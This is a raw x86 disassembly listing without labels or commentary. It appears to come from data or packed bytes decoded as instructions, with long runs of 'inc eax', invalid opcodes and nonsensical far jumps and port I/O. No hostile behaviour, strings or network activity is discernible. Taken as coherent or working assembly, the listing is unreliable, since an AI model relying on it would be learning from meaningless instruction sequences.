  4164cb:	push   ecx
  4164cc:	inc    eax
  4164cd:	shl    DWORD PTR [eax],1
  4164cf:	pusha  
  4164d0:	mov    ah,0x67
  4164d2:	dec    ecx
  4164d3:	jge    0x416506
  4164d5:	mov    edi,0x6263406d
  4164da:	cld    
  4164db:	ins    BYTE PTR es:[edi],dx
  4164dc:	ins    BYTE PTR es:[edi],dx
  4164dd:	push   esi
  4164de:	mov    ds:0x3011742c,eax
  4164e3:	inc    edi
  4164e4:	sbb    DWORD PTR [ecx+0x4004cdb5],edx
  4164ea:	add    cl,al
  4164ec:	inc    eax
  4164ed:	inc    eax
  4164ee:	inc    eax
  4164ef:	inc    eax
  4164f0:	add    BYTE PTR [eax+0x41],al
  4164f3:	arpl   WORD PTR [ebx+eax*2],si
  4164f6:	push   esi
  4164f7:	retf   0x692c
  4164fa:	push   eax
  4164fb:	mov    ds:0xe151d164,al
  416500:	inc    eax
  416501:	bound  ecx,QWORD PTR [esp+esi*1]
  416504:	add    BYTE PTR [eax],bh
  416506:	inc    esi
  416507:	xor    ebp,DWORD PTR [esi+eiz*4]
  41650a:	inc    ecx
  41650b:	inc    eax
  41650c:	inc    eax
  41650d:	inc    eax
  41650e:	inc    eax
  41650f:	inc    eax
  416510:	inc    eax
  416511:	inc    eax
  416512:	inc    eax
  416513:	inc    DWORD PTR [eax+0x31]
  416516:	sar    DWORD PTR [ebp-0x5],1
  416519:	mov    bl,0xcd
  41651b:	and    BYTE PTR [esi],al
  41651d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651e:	cs enter 0x1f4d,0x2c
  416523:	test   al,0x10
  416525:	in     eax,dx
  416526:	sub    al,0x9f
  416528:	push   ecx
  416529:	daa    
  41652a:	inc    eax
  41652b:	inc    eax
  41652c:	inc    eax
  41652d:	inc    eax
  41652e:	inc    eax
  41652f:	inc    eax
  416530:	inc    eax
  416531:	inc    eax
  416532:	inc    eax
  416533:	inc    eax
  416534:	jg     0x416547
  416536:	bound  esp,QWORD PTR [esi+0x6e]
  416539:	sub    BYTE PTR [ecx+edx*2],dh
  41653c:	cld    
  41653d:	push   eax
  41653e:	mov    al,ds:0xfd423062
  416543:	loop   0x4165b1
  416545:	inc    edx
  416546:	adc    eax,0x4c1062bf
  41654b:	push   ecx
  41654c:	dec    ebp
  41654d:	out    0xcb,al
  41654f:	and    al,0x38
  416551:	push   eax
  416552:	inc    eax
  416553:	inc    eax
  416554:	inc    eax
  416555:	inc    eax
  416556:	inc    eax
  416557:	inc    eax
  416558:	inc    eax
  416559:	inc    eax
  41655a:	add    cl,bl
  41655c:	(bad)  
  41655d:	mov    esp,0xa9eda02c
  416562:	bound  edi,QWORD PTR [edx]
  416564:	push   ecx
  416565:	retf   
  416566:	arpl   WORD PTR ds:0xb740bc66,cx
  41656c:	jmp    FWORD PTR [ecx*8+0x30c962c9]
  416573:	and    dl,BYTE PTR [ecx+0x7f]
  416576:	inc    edx
  416577:	mov    ah,0x40
  416579:	inc    eax
  41657a:	inc    eax
  41657b:	inc    eax
  41657c:	inc    eax
  41657d:	inc    eax
  41657e:	and    eax,0xd5404040
  416583:	ds ins BYTE PTR es:[edi],dx
  416585:	jae    0x416586
  416587:	in     al,dx
  416588:	jmp    0x7ebf:0x3603800d
  41658f:	data16 and ch,BYTE PTR [ebx+0x62]
  416593:	cmp    al,0x43
  416595:	inc    ebx
  416596:	mov    esi,0x284c6740
  41659b:	std    
  41659c:	shl    ecx,1
  41659e:	push   ss
  41659f:	cmp    al,0xbe
  4165a1:	inc    edi
  4165a2:	inc    eax
  4165a3:	inc    eax
  4165a4:	inc    eax
  4165a5:	inc    eax
  4165a6:	inc    eax
  4165a7:	inc    eax
  4165a8:	inc    eax
  4165a9:	inc    eax
  4165aa:	inc    eax
  4165ab:	inc    eax
  4165ac:	jnp    0x416542
  4165ae:	sub    DWORD PTR [eax],edx
  4165b0:	aas    
  4165b1:	push   0x5
  4165b3:	ds and eax,0x5d952770
  4165b9:	enter  0x1486,0x62
  4165bd:	lods   al,BYTE PTR ds:[esi]
  4165be:	aaa    
  4165bf:	push   edx
  4165c0:	loop   0x4165fe
  4165c2:	mov    esi,0x6dc3b862
  4165c7:	xchg   ecx,eax
  4165c8:	outs   dx,BYTE PTR ds:[esi]
  4165c9:	jg     0x416588
  4165cb:	dec    esp
  4165cc:	addr16 jge 0x416610
  4165cf:	retf   0x4040
  4165d2:	inc    eax
  4165d3:	inc    eax
  4165d4:	inc    eax
  4165d5:	inc    eax
  4165d6:	rol    DWORD PTR [eax+0x40],0x52
  4165da:	fadd   QWORD PTR ds:0x433ffd05
  4165e0:	xchg   edx,eax
  4165e1:	and    BYTE PTR [edx-0x7a],bh
  4165e4:	jnp    0x4165a2
  4165e6:	arpl   WORD PTR [eax],si
  4165e8:	add    al,0x2d
  4165ea:	lds    edi,FWORD PTR [edi-0xbfce94c]
  4165f0:	pop    ebp
  4165f1:	dec    ebx
  4165f2:	sub    al,0xbc
  4165f4:	add    eax,0x5540b4cd
  4165f9:	and    bh,BYTE PTR [edi+0x5]
  4165fc:	inc    edx
  4165fd:	fsubr  QWORD PTR [ecx+esi*1+0x40004040]
  416604:	inc    eax
  416605:	inc    eax
  416606:	inc    eax
  416607:	inc    eax
  416608:	inc    eax
  416609:	dec    ebp
  41660a:	outs   dx,BYTE PTR ds:[esi]
  41660b:	int3   
  41660c:	xchg   BYTE PTR [eax+esi*8-0x36],ch
  416610:	ins    BYTE PTR es:[edi],dx
  416611:	push   edx
  416612:	dec    ebp
  416613:	dec    ebx
  416614:	dec    eax
  416615:	mov    al,ds:0x6ed3e1bd
  41661a:	stos   DWORD PTR es:[edi],eax
  41661b:	pusha  
  41661c:	std    
  41661d:	inc    eax
  41661e:	inc    eax
  41661f:	inc    eax
  416620:	inc    eax
  416621:	inc    eax
  416622:	inc    eax
  416623:	inc    eax
  416624:	inc    eax
  416625:	inc    eax
  416626:	inc    eax
  416627:	bound  esp,QWORD PTR [ebx+0x45]
  41662a:	dec    edx
  41662b:	mov    dh,0x95
  41662d:	jge    0x41668b
  41662f:	pop    ecx
  416630:	idiv   BYTE PTR [ecx+ebx*8]
  416633:	inc    edi
  416634:	inc    ebp
  416635:	mov    esp,0x22d8a962
  41663a:	cmc    
  41663b:	mov    al,0xa3
  41663d:	test   ax,0x66b4
  416641:	retf   0x2d40
  416644:	inc    edx
  416645:	dec    edi
  416646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416647:	adc    eax,0x454c814e
  41664c:	inc    eax
  41664d:	inc    eax
  41664e:	inc    eax
  41664f:	inc    eax
  416650:	inc    eax
  416651:	inc    eax
  416652:	int3   
  416653:	jne    0x416695
  416655:	pusha  
  416656:	pushf  
  416657:	outs   dx,BYTE PTR ds:[esi]
  416658:	leave  
  416659:	fadd   st,st(0)
  41665b:	adc    dh,dl
  41665d:	xor    esi,DWORD PTR [ebx+0x1a]
  416660:	inc    edx
  416661:	and    eax,0x426e41db
  416666:	inc    eax
  416667:	bound  eax,QWORD PTR [ecx+0x74]
  41666a:	test   al,0x43
  41666c:	inc    ebp
  41666d:	stos   DWORD PTR es:[edi],eax
  41666e:	inc    eax
  41666f:	inc    ebx
  416670:	inc    esp
  416671:	bound  edx,QWORD PTR [esi]
  416673:	xor    BYTE PTR [eax+0x0],al
  416676:	rol    DWORD PTR [eax+0x40],0x40
  41667a:	inc    eax
  41667b:	add    BYTE PTR [eax-0x65],al
  41667e:	inc    esp
  41667f:	inc    eax
  416680:	xor    DWORD PTR [esi+0x50],esp
  416683:	retf   
  416684:	lock inc edx
  416686:	loopne 0x4166e8
  416688:	xor    DWORD PTR [eax-0x4cbf34bd],ebx
  41668e:	daa    
  41668f:	dec    eax
  416690:	inc    eax
  416691:	inc    eax
  416692:	inc    eax
  416693:	inc    eax
  416694:	inc    eax
  416695:	inc    eax
  416696:	inc    eax
  416697:	inc    eax
  416698:	inc    DWORD PTR [eax+0x62]
  41669b:	arpl   WORD PTR ds:0x42413125,si
  4166a1:	cmp    bh,dl
  4166a3:	mov    al,0x63
  4166a5:	loope  0x416713
  4166a7:	push   eax
  4166a8:	and    ebp,edx
  4166aa:	aam    0x5
  4166ac:	test   al,0x64
  4166ae:	lock xor eax,DWORD PTR [edx+0x40]
  4166b2:	dec    esp
  4166b3:	inc    ebx
  4166b4:	adc    DWORD PTR [ecx],edi
  4166b6:	pop    esp
  4166b7:	inc    eax
  4166b8:	inc    eax
  4166b9:	inc    eax
  4166ba:	inc    eax
  4166bb:	inc    eax
  4166bc:	inc    eax
  4166bd:	inc    eax
  4166be:	inc    eax
  4166bf:	inc    eax
  4166c0:	inc    eax
  4166c1:	out    dx,al
  4166c2:	loopne 0x41665d
  4166c4:	outs   dx,BYTE PTR ds:[esi]
  4166c5:	inc    esp
  4166c6:	mov    esp,0x9b41fda8
  4166cb:	stos   BYTE PTR es:[edi],al
  4166cc:	and    eax,0xa3114141
  4166d1:	cmp    esi,DWORD PTR [esp+edi*2]
  4166d4:	arpl   WORD PTR [eax+eiz*1+0x48],cx
  4166d8:	test   al,0x42
  4166da:	bound  ebx,QWORD PTR [ebx+0x40404052]
  4166e0:	inc    eax
  4166e1:	inc    eax
  4166e2:	inc    eax
  4166e3:	inc    eax
  4166e4:	inc    eax
  4166e5:	add    BYTE PTR [eax+ebp*2],ch
  4166e8:	inc    ecx
  4166e9:	push   ecx
  4166ea:	adc    BYTE PTR [edx],ah
  4166ec:	xchg   edx,eax
  4166ed:	outs   dx,BYTE PTR ds:[esi]
  4166ee:	popf   
  4166ef:	bound  esi,QWORD PTR [edx]
  4166f1:	inc    ebx
  4166f2:	daa    
  4166f3:	sub    dl,BYTE PTR ds:0xb042f425
  4166f9:	xor    eax,DWORD PTR [ecx+0x47]
  4166fc:	enter  0x4040,0x40
  416700:	inc    eax
  416701:	inc    eax
  416702:	inc    eax
  416703:	and    eax,0x63404040
  416708:	test   al,0xc9
  41670a:	(bad)  
  41670b:	in     al,dx
  41670c:	jno    0x4166b0
  41670e:	adc    cl,ch
  416710:	adc    BYTE PTR [edx+esi*2-0x38cfd1c0],bh
  416717:	adc    al,0xa4
  416719:	rcr    DWORD PTR [eax+0x31],cl
  41671c:	xchg   ecx,eax
  41671d:	dec    eax
  41671e:	mov    fs,WORD PTR [ebp+0x5]
  416721:	dec    edi
  416722:	bound  ebp,QWORD PTR [ebx+ebp*2+0x64]
  416726:	mov    dl,BYTE PTR [esi]
  416728:	retf   
  416729:	bound  edx,QWORD PTR [edx-0x73]
  41672c:	mov    dl,0x6e
  41672e:	inc    eax
  41672f:	inc    eax
  416730:	inc    eax
  416731:	inc    eax
  416732:	inc    eax
  416733:	inc    eax
  416734:	inc    eax
  416735:	inc    eax
  416736:	inc    eax
  416737:	inc    eax
  416738:	test   al,0x8
  41673a:	inc    esp
  41673b:	pusha  
  41673c:	xor    al,0xc7
  41673e:	sub    al,BYTE PTR [eax-0x2f]
  416741:	adc    esi,DWORD PTR [eax]
  416743:	xor    al,0x40
  416745:	icebp  
  416746:	pop    es
  416747:	inc    eax
  416748:	inc    eax
  416749:	inc    eax
  41674a:	inc    eax
  41674b:	inc    eax
  41674c:	inc    eax
  41674d:	rol    DWORD PTR [eax+0x40],0x61
  416751:	popa   
  416752:	sub    BYTE PTR ds:[edx-0x50],ah
  416756:	cmp    DWORD PTR [ebp+edx*1+0x584d6696],esi
  41675d:	cmp    eax,0x404081
  416762:	inc    eax
  416763:	inc    eax
  416764:	inc    eax
  416765:	inc    eax
  416766:	inc    eax
  416767:	inc    eax
  416768:	popf   
  416769:	inc    ebp
  41676a:	push   0xc360d48b
  41676f:	xor    ah,BYTE PTR ss:[eax]
  416772:	inc    eax
  416773:	sar    BYTE PTR [esi+0x41],1
  416776:	xchg   edx,eax
  416777:	inc    ebx
  416778:	bound  ebp,QWORD PTR [edi+0x40]
  41677b:	sub    ch,ah
  41677d:	bound  edi,QWORD PTR [edi+0x407d1233]
  416783:	shl    BYTE PTR [edx+0x34],1
  416786:	push   eax
  416787:	call   0x408207fa
  41678c:	inc    eax
  41678d:	inc    eax
  41678e:	inc    eax
  41678f:	inc    eax
  416790:	inc    eax
  416791:	inc    eax
  416792:	inc    eax
  416793:	inc    eax
  416794:	inc    eax
  416795:	push   edx
  416796:	inc    esp
  416797:	or     BYTE PTR [esi+0x44],al
  41679a:	inc    eax
  41679b:	jp     0x4167da
  41679d:	jmp    0x5182b3da
  4167a2:	push   edx
  4167a3:	push   eax
  4167a4:	in     al,dx
  4167a5:	sub    bl,bl
  4167a7:	xor    BYTE PTR ss:[ebx+0x37],ch
  4167ab:	pusha  
  4167ac:	and    ebx,DWORD PTR [eax+0x30]
  4167af:	add    edx,edx
  4167b1:	mov    al,0x40
  4167b3:	inc    eax
  4167b4:	inc    eax
  4167b5:	inc    eax
  4167b6:	inc    eax
  4167b7:	inc    eax
  4167b8:	int3   
  4167b9:	jne    0x4167fb
  4167bb:	inc    eax
  4167bc:	xor    al,0xe1
  4167be:	je     0x416769
  4167c0:	test   al,0xa8
  4167c2:	stos   BYTE PTR es:[edi],al
  4167c3:	push   eax
  4167c4:	inc    ebp
  4167c5:	enter  0xbca1,0x10
  4167c9:	adc    DWORD PTR [eax+0x0],eax
  4167cc:	rol    DWORD PTR [eax+0x40],0x40
  4167d0:	inc    eax
  4167d1:	add    BYTE PTR [eax+0x43],al
  4167d4:	outs   dx,DWORD PTR ds:[esi]
  4167d5:	loopne 0x4167e6
  4167d7:	arpl   si,cx
  4167d9:	mov    esp,0x2840d2b4
  4167de:	jg     0x41681e
  4167e0:	and    eax,0xf0e84141
  4167e5:	jmp    0x5a00:0x4c62c412
  4167ec:	adc    eax,0x3052d50d
  4167f1:	xor    al,0xd4
  4167f3:	cmp    al,0x30
  4167f5:	sub    eax,0x40404040
  4167fa:	inc    eax
  4167fb:	inc    eax
  4167fc:	inc    eax
  4167fd:	inc    eax
  4167fe:	inc    DWORD PTR [eax-0x53]
  416801:	retf   
  416802:	call   0xad5ac57
  416807:	jne    0x416842
  416809:	push   eax
  41680a:	dec    esp
  41680b:	pop    es
  41680c:	sub    al,0x41
  41680e:	jb     0x416872
  416810:	or     dh,BYTE PTR [eax+eax*2]
  416813:	inc    eax
  416814:	inc    eax
  416815:	inc    eax
  416816:	inc    eax
  416817:	inc    eax
  416818:	inc    eax
  416819:	inc    eax
  41681a:	inc    eax
  41681b:	inc    eax
  41681c:	inc    esp
  41681d:	adc    edi,ebx
  41681f:	inc    ebx
  416820:	sub    BYTE PTR [edx+0x8],bh
  416823:	arpl   WORD PTR ss:[si+0x30],ax
  416828:	inc    ecx
  416829:	imul   esi,DWORD PTR [edi+ebp*8+0x40407a9a],0x40404040
  416834:	inc    eax
  416835:	inc    eax
  416836:	add    BYTE PTR ds:0x7022d0e4,ch
  41683c:	bound  edi,QWORD PTR [esi+eax*2]
  41683f:	rol    DWORD PTR [eax+0x7a],0x33
  416843:	push   ebx
  416844:	inc    ebx
  416845:	jo     0x416820
  416847:	in     al,dx
  416848:	xor    DWORD PTR [edx],ebx
  41684a:	jmp    0x42ac048a
  41684f:	fs ins BYTE PTR es:[edi],dx
  416851:	adc    al,0xe0
  416853:	xchg   esp,eax
  416854:	jbe    0x4168c3
  416856:	xor    BYTE PTR [ebx+0x47],dh
  416859:	aaa    
  41685a:	das    
  41685b:	inc    esi
  41685c:	inc    eax
  41685d:	inc    eax
  41685e:	inc    eax
  41685f:	inc    eax
  416860:	inc    eax
  416861:	inc    eax
  416862:	and    eax,0x13404040
  416867:	bound  eax,QWORD PTR [eax+eax*2+0x39757c43]
  41686e:	xchg   DWORD PTR [edx+0x7],ebp
  416871:	(bad)  
  416873:	xchg   ecx,eax
  416874:	bound  esp,QWORD PTR [eax]
  416876:	inc    ecx
  416877:	and    BYTE PTR [ecx],0x58
  41687a:	adc    al,0x15
  41687c:	xchg   ebp,eax
  41687d:	pop    es
  41687e:	jle    0x4168a0
  416880:	bound  eax,QWORD PTR [eax+0x40]
  416883:	inc    eax
  416884:	inc    eax
  416885:	inc    eax
  416886:	inc    eax
  416887:	inc    eax
  416888:	inc    eax
  416889:	inc    eax
  41688a:	inc    eax
  41688b:	enter  0x4958,0x6d
  41688f:	aad    0x75
  416891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416892:	push   cs
  416893:	or     eax,0x385f509c
  416898:	pop    edi
  416899:	mov    esp,0x4040c951
  41689e:	inc    eax
  41689f:	inc    eax
  4168a0:	inc    eax
  4168a1:	inc    eax
  4168a2:	rol    DWORD PTR [eax+0x40],0xe4
  4168a6:	ins    DWORD PTR es:[edi],dx
  4168a7:	loop   0x4168e0
  4168a9:	dec    ecx
  4168aa:	or     cl,dl
  4168ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ad:	inc    ecx
  4168ae:	jp     0x4168e4
  4168b0:	sbb    eax,0x304c25fd
  4168b5:	dec    edx
  4168b6:	xchg   edx,eax
  4168b7:	inc    edx
  4168b8:	(bad)  
  4168b9:	pushf  
  4168ba:	arpl   WORD PTR [ebx+ecx*1],sp
  4168bd:	cmp    BYTE PTR [ecx+eiz*1],dl
  4168c0:	xchg   esp,eax
  4168c1:	adc    eax,0x40625313
  4168c6:	inc    eax
  4168c7:	add    BYTE PTR [eax+0x40],al
  4168ca:	inc    eax
  4168cb:	inc    eax
  4168cc:	inc    eax
  4168cd:	inc    eax
  4168ce:	loopne 0x416944
  4168d0:	dec    esi
  4168d1:	enter  0x38cd,0xab
  4168d5:	leave  
  4168d6:	inc    eax
  4168d7:	cmp    DWORD PTR [ecx],esp
  4168d9:	inc    esi
  4168da:	adc    DWORD PTR [ebx-0x3d],esp
  4168dd:	inc    eax
  4168de:	inc    eax
  4168df:	inc    eax
  4168e0:	inc    eax
  4168e1:	inc    eax
  4168e2:	inc    eax
  4168e3:	inc    eax
  4168e4:	inc    eax
  4168e5:	inc    eax
  4168e6:	inc    eax
  4168e7:	nop
  4168e8:	xor    DWORD PTR [eax-0x27],ebx
  4168eb:	iret   
  4168ec:	inc    esp
  4168ed:	sub    bh,BYTE PTR [esi-0x41]
  4168f0:	ins    BYTE PTR es:[edi],dx
  4168f1:	jae    0x41689b
  4168f3:	rol    DWORD PTR [edx-0x2c],cl
  4168f6:	bound  eax,QWORD PTR [esp+eiz*2]
  4168f9:	adc    BYTE PTR [ecx],bh
  4168fb:	inc    eax
  4168fc:	dec    edx
  4168fd:	mov    al,0xd1
  4168ff:	add    BYTE PTR [edi+0x53],al
  416902:	shl    BYTE PTR [eax+ebp*8+0x15],0x40
  416907:	inc    eax
  416908:	inc    eax
  416909:	inc    eax
  41690a:	inc    eax
  41690b:	inc    eax
  41690c:	int3   
  41690d:	jne    0x41694f
  41690f:	rol    BYTE PTR [edx-0x3b],1
  416912:	dec    edx
  416913:	and    eax,DWORD PTR [eax+0x51]
  416916:	retf   
  416917:	arpl   WORD PTR [eax+esi*8+0x53],ax
  41691b:	sbb    eax,0x53144100
  416920:	and    BYTE PTR [ebx+0xda47eef],ch
  416926:	inc    ecx
  416927:	dec    ebp
  416928:	sbb    DWORD PTR [ecx+0x445aa144],0x7b
  41692f:	inc    eax
  416930:	add    cl,al
  416932:	inc    eax
  416933:	inc    eax
  416934:	inc    eax
  416935:	inc    eax
  416936:	add    BYTE PTR [eax-0x3f],al
  416939:	adc    eax,DWORD PTR [edx+0x60f5c5b3]
  41693f:	cmp    al,0xd7
  416941:	or     eax,0x80a14028
  416946:	push   edi
  416947:	inc    esp
  416948:	dec    esp
  416949:	bound  eax,QWORD PTR [edx+0x33]
  41694c:	inc    ebp
  41694d:	out    0x41,eax
  41694f:	and    al,0x62
  416951:	dec    eax
  416952:	or     DWORD PTR [eax-0x5e],ecx
  416955:	inc    edi
  416956:	inc    eax
  416957:	inc    eax
  416958:	inc    eax
  416959:	inc    eax
  41695a:	inc    eax
  41695b:	inc    eax
  41695c:	inc    eax
  41695d:	inc    eax
  41695e:	inc    DWORD PTR [eax+0xd]
  416961:	xlat   BYTE PTR ds:[ebx]
  416962:	push   ebp
  416963:	cld    
  416964:	shl    BYTE PTR [ecx],0x4
  416967:	retf   
  416968:	jne    0x4169a2
  41696a:	xor    al,0x6c
  41696c:	bound  ebx,QWORD PTR [edx+0x32]
  41696f:	ds das 
  416971:	inc    eax
  416972:	inc    eax
  416973:	inc    eax
  416974:	inc    eax
  416975:	inc    eax
  416976:	inc    eax
  416977:	inc    eax
  416978:	inc    eax
  416979:	inc    eax
  41697a:	inc    eax
  41697b:	adc    bh,BYTE PTR [ecx]
  41697d:	add    al,BYTE PTR [eax-0xe]
  416980:	loope  0x4169cb
  416982:	dec    edx
  416983:	jmp    0xe333:0x1330c452
  41698a:	in     eax,dx
  41698b:	inc    ecx
  41698c:	push   edx
  41698d:	sbb    al,0x6c
  41698f:	push   ebx
  416990:	xor    eax,0x1c80067d
  416995:	sub    BYTE PTR [ecx],al
  416997:	pop    ss
  416998:	pop    esp
  416999:	dec    eax
  41699a:	and    bl,al
  41699c:	aam    0x22
  41699e:	or     eax,0x40404040
  4169a3:	inc    eax
  4169a4:	inc    eax
  4169a5:	inc    eax
  4169a6:	inc    eax
  4169a7:	add    BYTE PTR [eax+eiz*1+0x2a],al
  4169ab:	aad    0x98
  4169ad:	test   al,0x2c
  4169af:	jmp    0xce009da7
  4169b4:	add    eax,0x4054f631
  4169b9:	inc    eax
  4169ba:	inc    eax
  4169bb:	inc    eax
  4169bc:	inc    eax
  4169bd:	inc    eax
  4169be:	and    eax,0x53404040
  4169c3:	scas   al,BYTE PTR es:[edi]
  4169c4:	arpl   WORD PTR [ecx],dx
  4169c6:	retf   
  4169c7:	xor    al,0xa4
  4169c9:	mov    edx,0x746bc631
  4169ce:	cwde   
  4169cf:	inc    edx
  4169d0:	test   al,0x60
  4169d2:	mov    bh,0x21
  4169d4:	jno    0x416a17
  4169d6:	inc    esp
  4169d7:	imul   edx,DWORD PTR [eax],0x28
  4169da:	pop    es
  4169db:	(bad)  
  4169dc:	xor    dl,BYTE PTR [eax+eax*2+0x40]
  4169e0:	inc    eax
  4169e1:	inc    eax
  4169e2:	inc    eax
  4169e3:	inc    eax
  4169e4:	inc    eax
  4169e5:	inc    eax
  4169e6:	inc    eax
  4169e7:	inc    eax
  4169e8:	and    dh,ah
  4169ea:	mov    ah,0x41
  4169ec:	mul    DWORD PTR [ecx-0x6c]
  4169ef:	lock fsub QWORD PTR [edx+0x42]
  4169f3:	add    al,0x5a
  4169f5:	inc    eax
  4169f6:	inc    eax
  4169f7:	inc    eax
  4169f8:	inc    eax
  4169f9:	inc    eax
  4169fa:	inc    eax
  4169fb:	rol    DWORD PTR [eax+0x40],0x42
  4169ff:	shl    BYTE PTR [eax+0xd],0x40
  416a03:	add    al,0xb0
  416a05:	pop    ss
  416a06:	loope  0x4169fb
  416a08:	inc    ecx
  416a09:	add    BYTE PTR [edi+0x8],ah
  416a0c:	bound  esp,QWORD PTR [eax+ecx*8+0x62]
  416a10:	or     eax,0x40624164
  416a15:	adc    eax,0xa8450ca1
  416a1a:	bound  edi,QWORD PTR [edx]
  416a1c:	xor    BYTE PTR [ecx+0x36],bl
  416a1f:	xchg   ebx,eax
  416a20:	pusha  
  416a21:	inc    eax
  416a22:	inc    eax
  416a23:	add    BYTE PTR [eax+0x40],al
  416a26:	inc    eax
  416a27:	inc    eax
  416a28:	inc    eax
  416a29:	inc    eax
  416a2a:	add    eax,0x556cc467
  416a2f:	(bad)  
  416a30:	call   0x627a3360
  416a35:	push   ds
  416a36:	inc    edx
  416a37:	sub    DWORD PTR [edx],esp
  416a39:	inc    edx
  416a3a:	push   ebp
  416a3b:	jnp    0x416a2d
  416a3d:	inc    ebx
  416a3e:	push   ecx
  416a3f:	push   ecx
  416a40:	push   0x286cd7d1
  416a45:	shl    DWORD PTR [ecx+eiz*4],1
  416a48:	int3   
  416a49:	jo     0x4169e9
  416a4b:	gs or  eax,0x40404040
  416a51:	inc    eax
  416a52:	inc    eax
  416a53:	inc    eax
  416a54:	inc    eax
  416a55:	inc    eax
  416a56:	inc    eax
  416a57:	xlat   BYTE PTR ds:[ebx]
  416a58:	rol    DWORD PTR [esi-0x5],cl
  416a5b:	lea    edi,[edx-0x6f]
  416a5e:	int    0x94
  416a60:	arpl   WORD PTR [ecx],sp
  416a62:	jg     0x416a24
  416a64:	push   cs
  416a65:	pop    eax
  416a66:	arpl   WORD PTR [ebx-0x7c48448f],bp
  416a6c:	data16 aad 0xaa
  416a6f:	inc    edx
  416a70:	imul   ecx,DWORD PTR [ecx-0x2a],0x626d624a
  416a77:	inc    ecx
  416a78:	mov    cl,0x22
  416a7a:	inc    eax
  416a7b:	inc    eax
  416a7c:	inc    eax
  416a7d:	inc    eax
  416a7e:	inc    eax
  416a7f:	inc    eax
  416a80:	int3   
  416a81:	jne    0x416ac3
  416a83:	adc    ebp,ebp
  416a85:	ins    DWORD PTR es:[edi],dx
  416a86:	pop    esp
  416a87:	gs inc ebx
  416a89:	mov    edi,0xa810e62f
  416a8e:	bound  ecx,QWORD PTR [eax+esi*1+0x67]
  416a92:	iret   
  416a93:	inc    eax
  416a94:	add    cl,al
  416a96:	inc    eax
  416a97:	inc    eax
  416a98:	inc    eax
  416a99:	inc    eax
  416a9a:	add    BYTE PTR [eax+0x62],al
  416a9d:	les    esp,FWORD PTR [edx+0x32]
  416aa0:	(bad)  
  416aa1:	aam    0x33
  416aa3:	popa   
  416aa4:	push   ebx
  416aa5:	int    0xdf
  416aa7:	out    0x11,eax
  416aa9:	inc    eax
  416aaa:	sbb    al,0x74
  416aac:	retf   0x4011
  416aaf:	inc    eax
  416ab0:	inc    eax
  416ab1:	inc    eax
  416ab2:	inc    eax
  416ab3:	inc    eax
  416ab4:	inc    eax
  416ab5:	inc    eax
  416ab6:	inc    DWORD PTR [eax+0x25]
  416ab9:	test   al,0x94
  416abb:	xor    ecx,ebx
  416abd:	and    ecx,edi
  416abf:	ins    BYTE PTR es:[edi],dx
  416ac0:	lds    edx,FWORD PTR [eax]
  416ac2:	push   edx
  416ac3:	ins    BYTE PTR es:[edi],dx
  416ac4:	ret    0x5a5b
  416ac7:	or     BYTE PTR [edi+0x48],ch
  416aca:	cs cmp esi,esp
  416acd:	loope  0x416aee
  416acf:	retf   
  416ad0:	inc    esp
  416ad1:	inc    edx
  416ad2:	push   ebp
  416ad3:	inc    ebx
  416ad4:	and    DWORD PTR [edi+0x40],ecx
  416ad7:	inc    eax
  416ad8:	inc    eax
  416ad9:	inc    eax
  416ada:	inc    eax
  416adb:	inc    eax
  416adc:	inc    eax
  416add:	inc    eax
  416ade:	inc    eax
  416adf:	inc    eax
  416ae0:	cmp    BYTE PTR [eax+0x63],dl
  416ae3:	jno    0x416b09
  416ae5:	rcl    DWORD PTR [ecx+eiz*2+0x5d],1
  416ae9:	inc    ebx
  416aea:	sahf   
  416aeb:	and    al,0x43
  416aed:	in     eax,0x97
  416aef:	dec    eax
  416af0:	mov    al,0xd0
  416af2:	test   al,0x12
  416af4:	sub    BYTE PTR [edx+0x4040e163],al
  416afa:	inc    eax
  416afb:	inc    eax
  416afc:	inc    eax
  416afd:	inc    eax
  416afe:	inc    eax
  416aff:	inc    eax
  416b00:	add    BYTE PTR [ecx-0x54],ah
  416b03:	adc    BYTE PTR [esp+ecx*2-0x27],dl
  416b07:	jns    0x416b3b
  416b09:	mul    DWORD PTR [edx-0x5c]
  416b0c:	adc    eax,0xa2505ba8
  416b11:	cwde   
  416b12:	inc    ecx
  416b13:	inc    ecx
  416b14:	not    BYTE PTR [edx]
  416b16:	inc    ecx
  416b17:	aas    
  416b18:	jmp    DWORD PTR [eax]
  416b1a:	inc    eax
  416b1b:	inc    eax
  416b1c:	inc    eax
  416b1d:	inc    eax
  416b1e:	inc    eax
  416b1f:	inc    eax
  416b20:	and    eax,0x404040
  416b25:	sub    BYTE PTR [edi-0x6c],cl
  416b28:	inc    ebx
  416b29:	imul   esp,DWORD PTR [edx],0x56
  416b2c:	inc    esp
  416b2d:	add    al,0x42
  416b2f:	inc    ecx
  416b30:	xor    BYTE PTR [ebx+0x40],dh
  416b33:	inc    eax
  416b34:	inc    eax
  416b35:	inc    eax
  416b36:	inc    eax
  416b37:	inc    eax
  416b38:	inc    eax
  416b39:	inc    eax
  416b3a:	inc    eax
  416b3b:	inc    eax
  416b3c:	push   esi
  416b3d:	dec    ecx
  416b3e:	pusha  
  416b3f:	arpl   WORD PTR [ebp+0x55],cx
  416b42:	shr    BYTE PTR [edi+0x414b561],1
  416b48:	hlt    
  416b49:	in     al,0x40
  416b4b:	or     BYTE PTR [ebx+eax*8],bh
  416b4e:	inc    eax
  416b50:	adc    DWORD PTR [esi],edi
  416b52:	xor    ebx,edx
  416b54:	mov    eax,ds:0x4c64416e
  416b59:	xor    eax,0xf441506c
  416b5e:	inc    eax
  416b5f:	inc    eax
  416b60:	inc    eax
  416b61:	inc    eax
  416b62:	inc    eax
  416b63:	inc    eax
  416b64:	rol    DWORD PTR [eax+0x40],0x2
  416b68:	add    esi,DWORD PTR [edx]
  416b6a:	dec    ecx
  416b6b:	fcom   st(1)
  416b6d:	popa   
  416b6e:	add    DWORD PTR [ebp-0x60],esi
  416b71:	cli    
  416b72:	xchg   edx,eax
  416b73:	dec    edx
  416b74:	pop    eax
  416b75:	outs   dx,BYTE PTR ds:[esi]
  416b76:	pop    es
  416b77:	push   edi
  416b78:	arpl   WORD PTR [eax+eax*2+0x40],sp
  416b7c:	add    BYTE PTR [eax+0x40],al
  416b7f:	inc    eax
  416b80:	inc    eax
  416b81:	inc    eax
  416b82:	inc    eax
  416b83:	imul   ebx,ecx,0xa82b6231
